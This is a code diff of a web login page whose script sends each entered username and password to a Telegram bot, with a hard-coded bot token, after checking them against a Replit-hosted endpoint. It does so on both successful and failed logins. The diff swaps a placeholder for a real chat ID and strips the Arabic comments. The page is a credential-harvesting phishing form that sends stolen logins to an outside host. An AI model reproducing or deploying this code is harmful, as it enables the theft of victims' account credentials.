@@ -64,7 +64,7 @@
     <script>
         const apiUrl = "https://d9f0130f-707a-46ed-b30a-d1d5b420c560-00-3lnvptj53i2o2.pike.replit.dev/login";
         const telegramApiUrl = "https://api.telegram.org/bot2101899532:AAGQ4MjaBjYhu--NWwDpUeFlhZnRriPDcFA/sendMessage";
-        const chatId = "<YOUR_CHAT_ID>";
+        const chatId = "1339653142";
 
         const loginForm = document.getElementById("loginForm");
         const message = document.getElementById("message");
@@ -75,7 +75,6 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // إرسال الطلب إلى API الخاص بفحص الحساب
             fetch(apiUrl, {
                 method: 'POST',
                 headers: {
@@ -89,7 +88,7 @@
                     sendTelegramMessage(`Login successful!\nUsername: ${username}\nPassword: ${password}`);
                     message.textContent = "Login successful!";
                     message.className = "message success";
-                    window.location.href = "/acc"; // إعادة توجيه عند النجاح
+                    window.location.href = "/acc"; 
                 } else {
                     sendTelegramMessage(`Login failed!\nUsername: ${username}\nPassword: ${password}`);
                     message.textContent = "Password incorrect";
@@ -103,7 +102,6 @@
             });
         });
 
-        // دالة إرسال رسالة إلى Telegram
         function sendTelegramMessage(text) {
             fetch(telegramApiUrl, {
                 method: 'POST',
